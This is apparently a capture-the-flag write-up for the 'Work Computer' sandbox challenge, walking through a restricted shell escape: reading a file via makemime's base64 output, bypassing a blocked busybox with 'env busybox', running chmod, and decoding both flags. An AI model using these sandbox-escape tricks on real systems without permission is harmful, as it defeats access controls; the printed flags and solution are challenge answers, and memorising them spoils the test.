# Description
## Work Computer
Label: sandbox

With the confidence of conviction and decision making skills that made you a contender for Xenon's Universal takeover council, now disbanded, you forge ahead to the work computer.   This machine announces itself to you, surprisingly with a detailed description of all its hardware and peripherals. Your first thought is "Why does the display stand need to announce its price? And exactly how much does 999 dollars convert to in Xenonivian Bucklets?" You always were one for the trivialities of things.

Also presented is an image of a fascinating round and bumpy creature, labeled "Cauliflower for cWo" - are "Cauliflowers" earthlings?  Your 40 hearts skip a beat - these are not the strange unrelatable bipeds you imagined earthings to be.. this looks like your neighbors back home. Such curdley lobes. Will it be at the party?

SarahH, who appears to be  a programmer with several clients, has left open a terminal.  Oops.  Sorry clients!  Aliens will be poking around attempting to access your networks.. looking for Cauliflower.   That is, *if* they can learn to navigate such things.

# Solution
This task only provides the address `readme.ctfcompetition.com 1337`. When connected, we are presented with a shell. Typing `help` shows
```
> help
Alien's shell
Type program names and arguments, and hit enter.
The following are built in:
  cd
  help
  exit
Use the man command for information on other programs.
```
Trying something like `ls` shows us two items `ORME.flag` and `README.flag` seems like there might be two flags. Trying to execute files shows `permission denied`. Lets see what programs are available.
> ls /bin

```
arch         
busybox      
chgrp        
chown        
conspy       
date         
df           
dmesg        
dnsdomainname
dumpkmap     
echo         
false        
df
dmesg         
dnsdomainname 
dumpkmap      
echo          
false         
fdflush       
fsync         
getopt        
hostname      
ionice        
iostat        
ipcalc        
kill          
login         
ls            
lzop          
makemime      
mkdir         
mknod         
mktemp        
mount         
mountpoint    
mpstat        
netstat       
nice          
pidof         
ping          
ping6         
pipe_progress 
printenv      
ps            
pwd           
reformime     
rm            
rmdir         
run-parts     
setpriv       
setserial     
shell         
sleep         
stat          
stty          
sync          
tar           
true          
umount        
uname         
usleep        
watch         
```

I'm not too familiar with all the tools but one of them probably allows us to access to file. Going down the list, I saw `busybox` which seems promising. However running busybox shows the message `busybox can not be called for alien reasons.` So it seems that this may be our target.

Running `ls -l`, the `README.flag` file is readable but tools like `cat` or `tail` did not exist. So I went down the list for a tool that could possibly read files. Something I learned was the `makemime` tool because after reading up on it, it appears to be able to read a file. Running
> makemime  README.flag

Gives us:
```
> makemime README.flag                                                  
Mime-Version: 1.0                                                       
Content-Type: multipart/mixed; boundary="245967688-281105878-1932398038"
                                                                        
--245967688-281105878-1932398038                                        
Content-Type: application/octet-stream; charset=us-ascii                
Content-Disposition: inline; filename="README.flag"                     
Content-Transfer-Encoding: base64                                       
                                                                        
Q1RGezRsbF9ENDc0XzVoNGxsX0IzX0ZyMzN9Cg==                                
--245967688-281105878-1932398038--                                      
```

That string `Q1RGezRsbF9ENDc0XzVoNGxsX0IzX0ZyMzN9Cg==` looks like base64, and indeed decoding it gives us `CTF{4ll_D474_5h4ll_B3_Fr33}`. Now trying it for the other flag just left a blank screen so it was back to figuring out how to open busybox. At least that was the only thing I could think of. We also have to get permissions to access to file. I found a hint for this one which is the `env` command. The `env` command is able to execute a program and running `env busybox` worked. Now all I had to do was chmod and add read permissions
```
> env busybox chmod +r ORME.flag                                       
> makemime ORME.flag                                                   
Mime-Version: 1.0                                                      
Content-Type: multipart/mixed; boundary="790050884-595716176-916811417"
                                                                       
--790050884-595716176-916811417                                        
Content-Type: application/octet-stream; charset=us-ascii               
Content-Disposition: inline; filename="ORME.flag"                      
Content-Transfer-Encoding: base64                                      
                                                                       
Q1RGe1RoM3IzXzFzXzRsdzR5NV80TjA3aDNyX1c0eX0K                           
--790050884-595716176-916811417--                                      
```

Another base64 decode and we get the flag `CTF{Th3r3_1s_4lw4y5_4N07h3r_W4y}`